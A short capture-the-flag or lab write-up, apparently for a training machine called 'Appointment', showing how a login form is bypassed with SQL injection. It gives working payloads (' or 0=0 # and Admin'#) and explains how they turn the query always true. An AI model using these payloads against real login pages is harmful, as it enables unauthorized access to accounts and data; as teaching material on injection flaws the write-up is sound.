# Appointment

**Goal:** Bypass login authentication via SQL injection.

## Exploitation

Payload — email field:

```sql
' or 0=0 #
```

Password can be anything.

**How it works:** The app concatenates input directly into the query:

```sql
-- Original
SELECT * FROM users WHERE username = 'USER_INPUT';

-- After injection
SELECT * FROM users WHERE username = '' OR 0=0 #';
```

- `'` — closes the string
- `OR 0=0` — always true, returns all rows / bypasses auth
- `#` — comments out the rest (`--` also works depending on the SQL engine)

> [!NOTE]
> Skipped recon (`nmap`, `gobuster`) this time and went straight to SQLi — worked this time, but bad habit.
> Simpler payload that also works: `Admin'#` in the username field with any password.
